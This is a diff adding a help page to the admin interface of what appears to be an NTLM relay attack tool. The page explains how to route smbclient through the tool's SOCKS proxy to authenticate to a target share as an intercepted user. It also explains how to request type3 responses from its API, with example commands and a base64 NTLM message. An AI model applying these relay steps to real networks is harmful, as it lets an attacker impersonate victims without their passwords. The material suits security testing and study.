@@ -1,0 +1,34 @@
+
+<%=ZFadmingui.Header%>
+        <div class="span12">
+              <h1>Clients</h1>
+              <p>Most of the clients right now are written in as auto-clients into the rules. There are 2 manual driven clients available at release time now</p><br>
+              <h2>SOCKS Proxy</h2><br>
+              <h3>SMB</h3>
+              <p>Im not going to write a whole howto to do this, but you can use proxychains wrapped with smbclient or any other tool that uses smb on 445. The socks proxy will see the NTLM auth packets, snatch the type2 response, pass it to the tool, and then rewrite the type3 response.</p>
+              <p>The easiest way to explain this is with a code example. Say i see user testdom\testuser connecting. After configuring proxychains, 
+<pre>
+[ProxyList]
+socks5	127.0.0.1	4532
+</pre>
+              	I can do...</p>
+<pre>
+proxychains smbclient -U testdom/testuer%anybspassitignoresit //targetip/share
+</pre>
+<p>Cool? I think so.</p>
+<h3>HTTP</h3>
+<p>Not supported yet, but won't take much to add. It's coming soon.</p><br>
+<h2>API requests</h2>
+<p>So using the admin UI (default port 4531), and using basic auth, you can request type3 responses by passing the type2 of the target you recieve. This can be obviously added into any tool you want (similar to how squirtle was written).</p>
+<pre>
+http://&lt;adminuiip&gt;:&lt;adminuiport&gt;/api/?a=type2&d=&lt;userdomainyouwant&gt;@u=&lt;useryouwant&gt;&msg=&lt;base64encode(type2msg)&gt;
+</pre>
+<p>So for example, for api basic auth of api:api and wanting to auth as testdom\testuser...</p>
+<pre>
+http://api:api@127.0.0.1:4531/api/?a=type2&d=testdom&u=testuser&msg=TlRMTVNTUAACAAAADAAMADgAAAAVgoFiESIzRFVmd4gAAAAAAAAAAGYAZgBEAAAABgGwHQAAAA9EAE8ATQBBAEkATgACAAwARABPAE0AQQBJAE4AAQAQAEgATwBTAFQATgBBAE0ARQAEABQARABPAE0AQQBJAE4ALgBUAEwARAADACIAUwBFAFIAVgBFAFIALgBEAE8ATQBBAEkATgAuAFQATABEAAAAAAA=
+</pre>
+<p>Response with the type3 base64 encoded. The page waits for a response up until a timeout is reached. Fixes are needed if timeout is reached for now, but it works. Alpha-ish.</p><br>
+<h2>More Clients?</h2>
+<p>More request driven vs. rule driven clients are coming. Soon.</p>
+ 		</div>	
+<%=ZFadmingui.Footer%>
